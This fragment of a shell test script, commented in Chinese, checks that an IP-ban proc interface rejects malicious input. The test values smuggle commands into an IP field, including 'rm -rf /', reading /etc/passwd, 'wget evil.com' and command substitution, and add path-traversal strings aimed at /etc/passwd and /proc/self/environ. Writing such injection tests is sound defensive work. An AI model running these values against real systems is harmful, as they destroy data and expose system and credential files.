...
assert_failure "echo '192.168.1.1; rm -rf /' > '$PROC_BANS' 2>&1" "命令注入被拒绝"
assert_failure "echo '192.168.1.1 | cat /etc/passwd' > '$PROC_BANS' 2>&1" "管道注入被拒绝"
assert_failure "echo '192.168.1.1 && wget evil.com' > '$PROC_BANS' 2>&1" "逻辑运算符注入被拒绝"
assert_failure "echo '\$(whoami)' > '$PROC_BANS' 2>&1" "命令替换被拒绝"
assert_failure "echo '\`id\`' > '$PROC_BANS' 2>&1" "反引号命令替换被拒绝"

# 5.5 路径遍历
assert_failure "echo '../../etc/passwd' > '$PROC_BANS' 2>&1" "路径遍历被拒绝"
assert_failure "echo '../../../proc/self/environ' > '$PROC_BANS' 2>&1" "proc 遍历被拒绝"
